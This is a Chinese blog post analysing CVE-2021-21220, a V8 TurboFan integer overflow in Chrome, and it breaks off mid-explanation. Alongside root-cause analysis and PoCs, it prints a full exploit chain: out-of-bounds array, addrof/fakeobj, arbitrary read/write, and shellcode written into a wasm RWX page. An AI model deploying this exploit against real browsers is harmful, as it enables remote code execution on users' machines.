
<!DOCTYPE html>
<html lang="" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CVE-2021-21220 - Theorist</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Theorist,"> 
    <meta name="description" content="Theorist&#39;s Blog,一、漏洞信息1. 漏洞简述漏洞存在于 Chrome 的 JS 引擎的 JIT 编译器 Turbofan 当中的 Instruction Selector阶段

漏洞编号：CVE-2021-21220,"> 
    <meta name="author" content="Theorist"> 
    <link rel="alternative" href="atom.xml" title="Theorist" type="application/atom+xml"> 
    <link rel="icon" href="https://s2.ax1x.com/2019/07/10/Z6aCSs.png"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="loading">
    <span id="config-title" style="display:none">Theorist</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://theorist.fun"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">CVE-2021-21220</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">CVE-2021-21220</h1>
        <div class="stuff">
            <span>九月 29, 2021</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Chrome/" rel="tag">Chrome</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>


        </div>
        <div class="content markdown">
            <h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><p>漏洞存在于 Chrome 的 JS 引擎的 JIT 编译器 Turbofan 当中的 Instruction Selector阶段</p>
<ul>
<li>漏洞编号：CVE-2021-21220</li>
<li>漏洞类型：整数溢出</li>
<li>漏洞影响：远程代码执行</li>
<li>CVSS评分：8.8</li>
<li>利用难度：Medium</li>
<li>基础权限：不需要</li>
</ul>
<h3 id="2-组件概述"><a href="#2-组件概述" class="headerlink" title="2. 组件概述"></a>2. 组件概述</h3><p>TurboFan是 v8 的优化编译器，负责将字节码和一些分析数据作为输入并生成优化的机器代码。</p>
<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3. 漏洞利用"></a>3. 漏洞利用</h3><ul>
<li>利用这个整数溢出漏洞构造一个长度为1但编译器认为其长度为0的数组</li>
<li>通过 Array.prototype.shift() 获得一个长度为0xffffffff的越界数组</li>
<li>通过越界数组构造任意地址读写原语</li>
<li>修改 wasm 代码执行 shellcode</li>
</ul>
<h3 id="4-漏洞影响"><a href="#4-漏洞影响" class="headerlink" title="4. 漏洞影响"></a>4. 漏洞影响</h3><p>V8 version &lt; 8.9.255.25</p>
<p>Chrome version &lt; 89.0.4389.128</p>
<h3 id="5-解决方案"><a href="#5-解决方案" class="headerlink" title="5. 解决方案"></a>5. 解决方案</h3><p><a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2822629/3/src/compiler/backend/x64/instruction-selector-x64.cc">https://chromium-review.googlesource.com/c/v8/v8/+/2822629/3/src/compiler/backend/x64/instruction-selector-x64.cc</a></p>
<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
<li>靶机环境版本详述：Win10 1909</li>
<li>靶机配置：Chromium version = 89.0.4389.0  关闭沙箱</li>
<li>攻击机环境版本详述：kali 5.8.0</li>
<li>攻击机配置：Python 3.8.6(开web服务)</li>
</ul>
<h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2. 复现过程"></a>2. 复现过程</h3><ol>
<li><p>攻击机编写 exploit 开启服务等待访问</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exploit.js</span></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>])</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Module(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="keyword">let</span> buf2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x150</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">	<span class="keyword">return</span> u64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">	u64_buf[<span class="number">0</span>] = val;</span><br><span class="line">	<span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);</span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(x == <span class="number">-1</span>) x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);</span><br><span class="line">	arr.shift();</span><br><span class="line">	<span class="keyword">var</span> cor = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line">	<span class="keyword">return</span> [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">0x3000</span>; ++i)</span><br><span class="line">    foo();</span><br><span class="line"></span><br><span class="line">[arr, cor] = foo();</span><br><span class="line"></span><br><span class="line">arr[<span class="number">16</span>] = <span class="number">0x4242</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    arr[<span class="number">7</span>] = k;</span><br><span class="line">    <span class="keyword">return</span> ftoi(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    cor[<span class="number">0</span>] = itof(k);</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_map = ftoi(cor[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr2 = [itof(float_array_map), <span class="number">1.2</span>, <span class="number">2.3</span>, <span class="number">3.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake = fakeobj(addrof(arr2) + <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbread</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    <span class="keyword">return</span> (fake[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbwrite</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(BigInt(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_shellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf2);</span><br><span class="line">    <span class="keyword">let</span> buf_addr = addrof(buf2);</span><br><span class="line">    <span class="keyword">let</span> backing_store_addr = buf_addr + <span class="number">0x14n</span>;</span><br><span class="line">    arbwrite(backing_store_addr, addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint32(<span class="number">4</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + <span class="number">0x68n</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Address of rwx page: &quot;</span> + rwx_page_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">3833809148</span>,<span class="number">12642544</span>,<span class="number">1363214336</span>,<span class="number">1364348993</span>,<span class="number">3526445142</span>,<span class="number">1384859749</span>,<span class="number">1384859744</span>,<span class="number">1384859672</span>,<span class="number">1921730592</span>,<span class="number">3071232080</span>,<span class="number">827148874</span>,<span class="number">3224455369</span>,<span class="number">2086747308</span>,<span class="number">1092627458</span>,<span class="number">1091422657</span>,<span class="number">3991060737</span>,<span class="number">1213284690</span>,<span class="number">2334151307</span>,<span class="number">21511234</span>,<span class="number">2290125776</span>,<span class="number">1207959552</span>,<span class="number">1735704709</span>,<span class="number">1355809096</span>,<span class="number">1142442123</span>,<span class="number">1226850443</span>,<span class="number">1457770497</span>,<span class="number">1103757128</span>,<span class="number">1216885899</span>,<span class="number">827184641</span>,<span class="number">3224455369</span>,<span class="number">3384885676</span>,<span class="number">3238084877</span>,<span class="number">4051034168</span>,<span class="number">608961356</span>,<span class="number">3510191368</span>,<span class="number">1146673269</span>,<span class="number">1227112587</span>,<span class="number">1097256961</span>,<span class="number">1145572491</span>,<span class="number">1226588299</span>,<span class="number">2336346113</span>,<span class="number">21530628</span>,<span class="number">1096303056</span>,<span class="number">1515806296</span>,<span class="number">1497454657</span>,<span class="number">2202556993</span>,<span class="number">1379999980</span>,<span class="number">1096343807</span>,<span class="number">2336774745</span>,<span class="number">4283951378</span>,<span class="number">1214119935</span>,<span class="number">442</span>,<span class="number">0</span>,<span class="number">2374846464</span>,<span class="number">257</span>,<span class="number">2335291969</span>,<span class="number">3590293359</span>,<span class="number">2729832635</span>,<span class="number">2797224278</span>,<span class="number">4288527765</span>,<span class="number">3296938197</span>,<span class="number">2080783400</span>,<span class="number">3774578698</span>,<span class="number">1203438965</span>,<span class="number">1785688595</span>,<span class="number">2302761216</span>,<span class="number">1674969050</span>,<span class="number">778267745</span>,<span class="number">6649957</span>];</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--exploit.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;exp.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> shell</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 -m http.server 80</span></span><br></pre></td></tr></table></figure></li>
<li><p>靶机关闭沙箱访问exploit<br><img src="https://z3.ax1x.com/2021/09/29/443Woq.png"></p>
</li>
</ol>
<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h3><ul>
<li>漏洞文件：src/compiler/backend/x64/instruction-selector-x64.cc</li>
<li>漏洞函数：InstructionSelector::VisitChangeInt32ToInt64</li>
</ul>
<h3 id="2-背景知识"><a href="#2-背景知识" class="headerlink" title="2. 背景知识"></a>2. 背景知识</h3><p>V8 引擎工作基本流程图示：<br><img src="https://z3.ax1x.com/2021/09/29/4435WT.png"></p>
<p>工作流程简述：</p>
<ul>
<li>扫描所有代码，进行词法分析，生成 Tokens</li>
<li>Parser 解析器根据 Tokens 生成 AST</li>
<li>Ignition 解释器将 AST 转化为字节码并解释执行</li>
<li>TurboFan 编译器将热点函数编译优化成机器指令以提高效率</li>
</ul>
<p>TurboFan是 v8 的优化编译器，负责将字节码和一些分析数据作为输入并生成优化的机器代码。</p>
<p>当 Ignition 开始执行 JavaScript 代码后，V8 会一直观察 JavaScript 代码的执行情况，并记录执行信息，如每个函数的执行次数、每次调用函数时，传递的参数类型等。</p>
<p>如果一个函数被调用的次数超过了内设的阈值，监视器就会将当前函数标记为热点函数（Hot Function），并将该函数的字节码以及执行的相关信息发送给 TurboFan。TurboFan 会根据执行信息做出一些进一步优化此代码的假设，在假设的基础上将字节码编译为优化的机器代码。如果假设成立，那么当下一次调用该函数时，就会执行优化编译后的机器代码，以提高代码的执行性能。</p>
<p>那如果假设不成立进行 deoptimize（优化回退），将优化编译后的机器代码还原为字节码。</p>
<h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h3><h4 id="1-基础分析"><a href="#1-基础分析" class="headerlink" title="1. 基础分析"></a>1. 基础分析</h4><p>poc及输出如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);</span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(x==<span class="number">-1</span>) x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">print(foo());</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x3000</span>; i ++)</span><br><span class="line">	foo();</span><br><span class="line">print(foo());</span><br><span class="line"><span class="comment">//0</span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>foo()</code>函数在编译优化前后的返回值不同</p>
<p>关键代码是这里</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>对这行代码执行流程和类型转换分析如下：</p>
<ol>
<li>_arr[0] 类型为 UInt32</li>
<li>_arr[0] ^ 0 之后类型转化成 Int32</li>
<li>为了之后的 +1 把 Int32 类型转化成 Int64</li>
<li>执行 Int64Add</li>
</ol>
<h4 id="2-静态分析"><a href="#2-静态分析" class="headerlink" title="2. 静态分析"></a>2. 静态分析</h4><p>用<code>turbolizer</code>分析优化过程，TFGenericLowering 阶段关键部分如下</p>
<p><img src="https://z3.ax1x.com/2021/09/29/443jFx.png"></p>
<p>下一个阶段 TFEarlyOptimization</p>
<p><img src="https://z3.ax1x.com/2021/09/29/443vY6.png"></p>
<p>WordXor 节点在优化被删掉，直接将左操作数往下传，优化代码如下：</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448n1S.png"></p>
<p>再看最后的 TFLateGraphTrimming 阶段</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448Gt0.png"></p>
<p>可以看到 Load 节点的类型是 Uint32，传入了 ChangeInt32ToInt64 节点，而ChangeInt32ToInt64 节点是接收 Int32 类型的，即这里本应该传入 Int32 但是编译优化后传入的是 UInt32，ChangeInt32ToInt64 指令选择代码如下：</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448UcF.png"></p>
<p>综上，漏洞成因是 WordXor 节点被删除后 UInt32 未能转化成 Int32 就传入 ChangeInt32ToInt64，结果是 ChangeInt32ToInt64 的指令选择中原本应该用符号扩展却错误地使用了无符号扩展，导致整数溢出，在之后的一系列计算后把原本的正确值0变成了1。</p>
<h5 id="1-补丁Diff"><a href="#1-补丁Diff" class="headerlink" title="1. 补丁Diff"></a>1. 补丁Diff</h5><p><img src="https://z3.ax1x.com/2021/09/29/4480B9.png"></p>
<p>使 ChangeInt32ToInt64 将所有输入都当作 Int64 处理，使用带符号扩展指令。</p>
<h5 id="2-漏洞函数分析"><a href="#2-漏洞函数分析" class="headerlink" title="2. 漏洞函数分析"></a>2. 漏洞函数分析</h5><p>ChangeInt32ToInt64 是用来处理 Int32 的扩展的，但它也支持判断传入数据类型处理 UInt32 扩展，若错误地传入数据类型则会引起整数溢出。</p>
<h4 id="3-动态分析"><a href="#3-动态分析" class="headerlink" title="3. 动态分析"></a>3. 动态分析</h4><p>在 poc.js 中设置好断点和优化后的函数信息打印，用 gdb 调试</p>
<p>优化后代码如下</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448yh6.png"></p>
<p>不带符号</p>
<h3 id="4-利用思路"><a href="#4-利用思路" class="headerlink" title="4. 利用思路"></a>4. 利用思路</h3><ul>
<li>利用这个整数溢出漏洞构造一个长度为1但编译器认为其长度为0的数组</li>
<li>通过 Array.prototype.shift() 获得一个长度为0xffffffff的越界数组</li>
<li>通过越界数组构造任意地址读写原语</li>
<li>修改 wasm 代码执行 shellcode</li>
</ul>
<h4 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1. 利用条件"></a>1. 利用条件</h4><p>V8 version &lt; 8.9.255.25</p>
<p>关闭沙箱</p>
<h4 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h4><h5 id="构造整数溢出的数组"><a href="#构造整数溢出的数组" class="headerlink" title="构造整数溢出的数组"></a>构造整数溢出的数组</h5><p>利用上文分析的漏洞，不再赘述</p>
<h5 id="通过-Array-prototype-shift-获得一个长度为0xffffffff的越界数组"><a href="#通过-Array-prototype-shift-获得一个长度为0xffffffff的越界数组" class="headerlink" title="通过 Array.prototype.shift() 获得一个长度为0xffffffff的越界数组"></a>通过 Array.prototype.shift() 获得一个长度为0xffffffff的越界数组</h5><p>Array.prototype.shift() 是利用过程中需要用到的另一个漏洞，验证poc如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);</span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(x==<span class="number">-1</span>) x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);</span><br><span class="line">	arr.shift();</span><br><span class="line">	<span class="keyword">return</span> arr.length;</span><br><span class="line">&#125;</span><br><span class="line">print(foo());</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x3000</span>; i ++)</span><br><span class="line">	foo();</span><br><span class="line">print(foo());</span><br><span class="line"><span class="comment">//0</span></span><br><span class="line"><span class="comment">//-1</span></span><br></pre></td></tr></table></figure>

<p>shift 函数的作用是移除数组中的一个元素，同时长度减一，且减长度时没有长度为 0 的边界判断，但实际移除元素时若数组中没有元素会移除失败，长度也不会减一。</p>
<p>从 Turbolizer 中分析 TFSimplifiedLowering 阶段流程中<code>x</code>的可能值变化：</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448g1O.png"></p>
<p>可见最终创建 Array 时<code>x</code>的值只能是 0 ，所以在 JIT 优化中认为 shift 之后的数组长度一定为 -1 ，直接将其写入到优化后的代码中：</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4484HA.png"></p>
<p>之所以是 0xfffffffe 而不是 0xffffffff 是因为在 V8 中，把数据的最后一位当成一个标志位，若为 0 则表示是一个 smi(small int) ，将其右移一位得到的值就是真实值；若为 1 则表示该值是一个地址，表示该地址处的一个对象，将其最后一位 1 变成 0 得到实际地址(因为对齐最后两位不用，这里算是将其利用起来)。</p>
<p>这里虽然 JIT 认为传入的<code>x</code>一定为 0 ，可是实际传入的值却是 1 ，导致数组中是有一个元素可供正常移除的，所以 shift 函数可以正常执行，得到一个长度为 0xffffffff 的越界数组。</p>
<p>这个漏洞也已经<a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2823707">修补</a>，在 pop 和 shift 的长度减一时加入了边界检查：</p>
<p><img src="https://z3.ax1x.com/2021/09/29/448H9f.png"></p>
<h5 id="通过越界数组构造任意地址读写原语"><a href="#通过越界数组构造任意地址读写原语" class="headerlink" title="通过越界数组构造任意地址读写原语"></a>通过越界数组构造任意地址读写原语</h5><p>这里需要了解 V8 对象的布局，比较复杂，参考<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000039908658">链接</a></p>
<p>在越界数组<code>arr</code>后接一个 float array 数组<code>cor</code>，调试确定偏移，利用<code>arr</code>修改<code>cor</code>的长度字段，得到一个越界 float array 数组，再利用这两个数组构造 <code>addrof</code> 和 <code>fakeobj</code> 原语：</p>
